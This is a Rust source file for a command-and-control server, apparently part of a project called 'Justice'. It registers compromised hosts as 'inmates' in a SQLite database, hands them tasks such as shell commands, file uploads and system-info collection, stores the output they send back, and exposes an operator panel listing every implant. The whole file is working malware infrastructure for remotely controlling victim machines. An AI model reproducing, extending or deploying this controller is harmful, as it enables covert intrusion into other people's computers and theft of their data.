extern crate Justice;
#[macro_use] extern crate rocket;
use rocket::serde::{Deserialize, Serialize, json::Json};
use Justice::actions::c2_actions;
use serde_json;
use Justice::CheckInResponse;
use Justice::PostRequest;
use Justice::Inmate;
use rusqlite::{Connection, Result, params};
use std::time::SystemTime;
use std::fs;



fn create_db() {
    let conn = Connection::open("prisoninmates.db");
    match conn {
        Ok(conn) => {
           match conn.execute(
                "CREATE TABLE IF NOT EXISTS inmates (
                    rowid INTEGER PRIMARY KEY,
                    os TEXT,
                    hostname TEXT,
                    ip TEXT,
                    pid INTEGER,
                    last_checkin INTEGER,
                    pending_instruct TEXT,
                    pending_instruct_type TEXT
                )",
                [],
            ) {
                Ok(_) => {
                    {}
                }
                Err(_) => {
                    panic!("Error creating table");
                }
            }
        },
        Err(_) => {
            panic!("Error creating database, make sure you can write a file to the current directory, or modify the path");
        }
    }
}

#[get("/")]
fn index() -> &'static str {
    "Hello, world!"
}

#[post("/c2/<implant_id>", data = "<c2_request>")]
fn handle_c2_request(implant_id: u32, c2_request: Json<PostRequest>) -> &'static str {
    /* TODO */
    match implant_exists(implant_id) {
        Ok(inmate) => {
            let request = c2_request.into_inner();
            //println!("{} performed action {:?}, result: {}", implant_id, request.action_type, String::from_utf8(&request.content).unwrap());
            let timestamp = &request.timestamp;
            let dir_path = format!("artifacts/{}/{}", implant_id, &request.action_type.to_string());
            fs::create_dir_all(&dir_path).unwrap();
            let file_path = format!("{}/{}", dir_path, timestamp);
            fs::write(file_path, request.content).unwrap();
            /* 
            match request.action_type {
                c2_actions::ShellCommand => {
                    let command = request.action_parameters;
                    let output = Command::new("sh")
                        .arg("-c")
                        .arg(command)
                        .output()
                        .expect("failed to execute process");
                    let conn = Connection::open("prisoninmates.db").unwrap();
                    let _ = conn.execute(
                        "UPDATE inmates SET pending_instruct = ?1, pending_instruct_type = ?2 WHERE rowid = ?3",
                        params![String::from_utf8(output.stdout).unwrap(), "ShellCommand", implant_id]
                    );
                }
                c2_actions::FileUpload => {
                    let conn = Connection::open("prisoninmates.db").unwrap();
                    let _ = conn.execute(
                        "UPDATE inmates SET pending_instruct = ?1, pending_instruct_type = ?2 WHERE rowid = ?3",
                        params!["FileUpload", implant_id]
                    );
                }
                c2_actions::Wait => {
                    let conn = Connection::open("prisoninmates.db").unwrap();
                    let _ = conn.execute(
                        "UPDATE inmates SET pending_instruct = ?1, pending_instruct_type = ?2 WHERE rowid = ?3",
                        params!["", "Wait", implant_id]
                    );
                }
                _ => {
                    println!("Unknown action type");
                }
            }*/
        }
        Err(_) => {
            println!("Unknown implant tried to post, id: {}", implant_id);
        }
    }
    return "ok";
}

#[get("/c2/<implant_id>")] 
fn get_c2_request(implant_id: u32) -> Json<CheckInResponse> {
    
    match implant_exists(implant_id) {
        Ok(inmate) => {
            let conn = Connection::open("prisoninmates.db").unwrap();
            let _ = conn.execute(
                "UPDATE inmates SET pending_instruct = ?1, pending_instruct_type = ?2 WHERE rowid = ?3",
                params!["", "wait", implant_id]
            );
            return Json(CheckInResponse {
                task: inmate.pending_instruct_type,
                task_parameters: inmate.pending_instruct,
            })
        }
        Err(_) => {
            let conn = Connection::open("prisoninmates.db").unwrap();
            let _ = conn.execute(
                "INSERT INTO inmates (rowid, os, hostname, ip, pid, last_checkin, pending_instruct, pending_instruct_type) VALUES (?1, ?2, ?3, ?4, ?5, ?6, ?7, ?8)",
                params![implant_id, "Unknown", "Unknown", "TBD", 1234, SystemTime::now().duration_since(SystemTime::UNIX_EPOCH).unwrap().as_secs(), "", "wait"]
            );
            println!("Implant registered id: {}", implant_id);
            fs::create_dir_all(format!("artifacts/{}", implant_id)).unwrap();
            return Json(CheckInResponse {
                task: c2_actions::SystemInfo,
                task_parameters: "".to_string(),
            });
        }
    }
}

#[get("/operator")]
fn operator_panel() -> Json<String> {
    let conn = Connection::open("prisoninmates.db").unwrap();
    let mut stmt = conn.prepare("SELECT * FROM inmates").unwrap();
    let mut inmate_iter = stmt.query_map([], |row| {
        let instr_type: String = row.get(7)?;
        Ok(Inmate {
            rowid: row.get(0)?,
            os: row.get(1)?,
            hostname: row.get(2)?,
            ip: row.get(3)?,
            pid: row.get(4)?,
            last_checkin: row.get(5)?,
            pending_instruct: row.get(6)?,
            pending_instruct_type: instr_type.parse::<c2_actions>().unwrap(),
        })
    }).unwrap();
    let mut all_inmates: Vec<Inmate> = Vec::new();
    for inmate in inmate_iter {
        let inmate_unwrapped = inmate.unwrap();
        all_inmates.push(inmate_unwrapped);
    }

    return Json(serde_json::to_string(&all_inmates).unwrap());
}

fn implant_exists(implant_id: u32) -> Result<Inmate, &'static str> {
    let conn = Connection::open("prisoninmates.db").unwrap();
    let mut stmt = conn.prepare("SELECT * FROM inmates").unwrap();
    
    let inmate_iter = stmt.query_map([], |row| {
        let instr_type: String = row.get(7)?;
        Ok(Inmate {
            rowid: row.get(0)?,
            os: row.get(1)?,
            hostname: row.get(2)?,
            ip: row.get(3)?,
            pid: row.get(4)?,
            last_checkin: row.get(5)?,
            pending_instruct: row.get(6)?,
            pending_instruct_type: instr_type.parse::<c2_actions>().unwrap(),
        })
    }).unwrap();
    for inmate in inmate_iter {
        let inmate_unwrapped = inmate.unwrap();
        if inmate_unwrapped.rowid == implant_id {
            let _ = conn.execute(
                "UPDATE inmates SET last_checkin = ?1 WHERE rowid = ?2",
                params![SystemTime::now().duration_since(SystemTime::UNIX_EPOCH).unwrap().as_secs(), implant_id]
            );
            return Ok(inmate_unwrapped)
        }
    }
    return Err("Does not exist")
}
 
#[launch]
fn rocket() -> _ {
    create_db();
    rocket::build()
        .mount("/", routes![index])
        .mount("/", routes![handle_c2_request])
        .mount("/", routes![get_c2_request])
        .mount("/", routes![operator_panel])
}